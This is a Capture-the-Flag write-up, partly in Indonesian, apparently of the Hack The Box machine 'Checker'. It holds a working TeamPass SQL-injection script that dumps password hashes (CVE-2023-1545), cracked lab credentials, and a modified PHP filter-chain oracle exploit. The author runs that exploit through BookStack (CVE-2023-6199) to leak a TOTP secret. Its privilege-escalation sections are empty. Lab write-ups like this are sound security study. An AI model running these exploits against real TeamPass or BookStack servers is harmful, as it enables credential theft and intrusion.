![](Pasted%20image%2020250223103627.png)
# 1.  Service Enumeration

| IP  | Port       |
| --- | ---------- |
| TCP | 22,80,8080 |
| UDP | -          |
## A.  TCP Active Port 
![](Pasted%20image%2020250223103808.png)
## B. UDP Active Port
No result.
## C.  Domain
![](Pasted%20image%2020250223112458.png)
add them to /etc/host
# 2. Initial Access
## A. Web
Port 80
fitur:
- Login
- Forgot Password
![](Pasted%20image%2020250223104349.png)
Port 8080 
Fitur:
- Login, ada satu form unik dengan value 60
- menggunakan **Teampass** -> coba cek versi nya
![](Pasted%20image%2020250223104646.png)
## B. Directory
ga bisa ada waf kedua web servernya
![](Pasted%20image%2020250223111956.png)
ada rate limiting
![](Pasted%20image%2020250223104841.png)
## C. checker.htb Forgot Password
reflected
![](Pasted%20image%2020250223113128.png)
cannot be exploited yet
![](Pasted%20image%2020250223122524.png)
coba test SQLi injection save it to file, and send it to sqlmap
![](Pasted%20image%2020250223212122.png)
tidak berhasil
## D. Teampass
tidak menemukan version, coba cari manual
https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612
[CVE-2023-1545](https://www.cve.org/CVERecord?id=CVE-2023-1545)
![](Pasted%20image%2020250224142310.png)
```
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done
```

dapat credential
![](Pasted%20image%2020250224144238.png)
```
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

berhasil crack -> cheerleader
![](Pasted%20image%2020250224150057.png)
![](Pasted%20image%2020250224150212.png)
## E. Credential on teampass
bob@checker.htb mYSeCr3T_w1kI_P4sSw0rD
![](Pasted%20image%2020250224153732.png)
bisa login![](Pasted%20image%2020250224194525.png)
reader hiccup-publicly-genesis
![](Pasted%20image%2020250224153936.png)
tidak bisa login
![](Pasted%20image%2020250224154041.png)
## Analisa Checker.htb
1. Search
   try input ' -> input validasi, no error
2. Shelves
   - create shelves -> no html injection
   - upload cover -> invalid fil
   -  tag -> no xss
3. Books
   - create shelves -> no html injection
   - upload cover -> invalid fil
   -  tag -> no xss
ada OTP setup, coba pake menggunakan google authenticator
![](Pasted%20image%2020250224211926.png)

ternyata Bookstack ada versinya juga hmmmmm
Bookstack v23.10.2
![](Pasted%20image%2020250228093950.png)
CVE-2023-6199 -> https://fluidattacks.com/advisories/imagination/
kenapa sampe payloadnya begini???? masih tidak ngerti
https://github.com/synacktiv/php_filter_chains_oracle_exploit 
edit requestor.py
```
import json
import requests
import time
import base64  # Ensure base64 module is imported
from filters_chain_oracle.core.verb import Verb
from filters_chain_oracle.core.utils import merge_dicts
import re

"""
Class Requestor, defines all the request logic.
"""
class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        self.json_input = json_input
        self.match = match
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        if in_chain != "":
            print("[*] The following chain will be in each request : {}".format(in_chain))
            in_chain = "|convert.iconv.{}".format(in_chain)
        if match:
            print("[*] The following pattern will be matched for the oracle : {}".format(match))
        self.in_chain = in_chain
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        self.instantiate_session()
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False
        
    """
    Instantiates a requests session for optimization
    """
    def instantiate_session(self):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False

    def join(self, *x):
        return '|'.join(x)

    """
    Used to see how much time a 500 error takes to calibrate the timing attack
    """
    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    """
    Used to parse the option parameter sent by the user
    """
    def parse_parameter(self, filter_chain):
        data = {}
        if '[' and ']' in self.parameter: # Parse array elements
            
            main_parameter = [re.search(r'^(.*?)\[', self.parameter).group(1)]
            sub_parameters = re.findall(r'\[(.*?)\]', self.parameter)
            all_params = main_parameter + sub_parameters
            json_object = {}
            temp = json_object
            for i, element in enumerate(all_params):
                if i == len(all_params) -1:
                    temp[element] = filter_chain
                else:
                    temp[element] = {}
                    temp = temp[element]
            data = json_object
        else:
            data[self.parameter] = filter_chain
        return merge_dicts(data, self.data)

    """
    Returns the response of a request defined with all options
    """
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        merged_data = self.parse_parameter(filter_chain)

        # Fix indentation: Encode filter chain in Base64
        encoded_bytes = base64.b64encode(filter_chain.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        payload = f"<img src='data:image/png;base64,{encoded_str}'/>"
        merged_data[self.parameter] = payload  # Fixed indentation

        # Make the request, the verb and data encoding is defined
        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                if self.json_input: 
                    requ = self.session.put(self.target, json=merged_data)
                else:
                    requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                if self.json_input:
                    requ = self.session.delete(self.target, json=merged_data)
                else:
                    requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                if self.json_input:
                    requ = self.session.post(self.target, json=merged_data)
                else:
                    requ = self.session.post(self.target, data=merged_data)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    """
    Used to determine if the answer trigged the error based oracle
    TODO : increase the efficiency of the time based oracle
    """
    def error_oracle(self, s):
        requ = self.req_with_response(s)

        if self.match:
            # DEBUG print("PATT", (self.match in requ.text))
            return self.match in requ.text 

        if self.time_based_attack:
            # DEBUG print("ELAP", requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01))
            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
        
        # DEBUG print("CODE", requ.status_code == 500)
        return requ.status_code == 500

```
jalankan exploit untuk mendapatkan secret OTP

```
python3 filters_chain_oracle_exploit.py --target "http://checker.htb/ajax/page/18/save-draft" --file "/backup/home_backup/home/reader/.google_authenticator" --parameter "html" --verb PUT --headers "{\"X-CSRF-TOKEN\": \"uA9DDjtgWvPTB94cZeZcfCAAQDaDPqFFIzNJdf2h\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"jstree_select=1; teampass_session=n80skn551jqlokvpqj6i50cjar; bookstack_session=eyJpdiI6IjRqWmx6N3pOcFRwT04xTE50bXFVVGc9PSIsInZhbHVlIjoiV003NVIzTVpLYlhZSWorWE0zSXlhMmVvbEJEVVZHL05EcGNGTTBDOFV0NVVVQ0JRdnRyS1VPblFBZkgvU3VheGdJbVFlcytjUEZyQkhKZDFxYmMwdXUvL3pvMzZCZWFGWWNNVjdQL1lmRFd2cU93STBHV1VYdC93VnRZR3lQTC8iLCJtYWMiOiI1NmI2Y2M5MGRlMjU2NmMzZGQ0Y2JhMWY4ZmRjMGFlM2YxMTVjYTgyYTBjYmU2ZDRmYjczMWI4YTg5OTNhMzYxIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6ImhBMUlVREhTRTl6bVJTZDNrU1A0amc9PSIsInZhbHVlIjoiTGFOeS9mVlJtN3BLcm9Fbjh1SlhtY1RXSnJubGtrc3FJczdFY01aTXNTUCtLQlRvWUR4TWlURVdCRkw2aTlIbkRDaFR4bzJJaW9UTUFXSDdZNkNkcjcrTGhSVEU5QnpJWkZtdGJoMkVucWhHVW5UV2xHRTZUeW40VFAzeEJiQ3AiLCJtYWMiOiIwYzQwYmY2MzQzOTk3YjQzNmU3Yjc0YmYzNjVhMGM4NmUyMjJhMjFiOGM5NzM3MjU2ZGY0NTM0MTEzZjNkZDVmIiwidGFnIjoiIn0%3D\"}"
```
Dapat secret -> DVDBRAODLCWF7I2ONA4K5LQLUE
![](Pasted%20image%2020250228141853.png)

Coba ganti vpn ke US (Tips dari Forum)
masukkan kode otp dari situs ini
![](Pasted%20image%2020250228142747.png)
Berhasil login ssh dan dapat
![](Pasted%20image%2020250228142856.png)
# 3. Privilege Escalation
## a.

# 4. Post Exploitation
## a. User Flag
## b. Root Flag
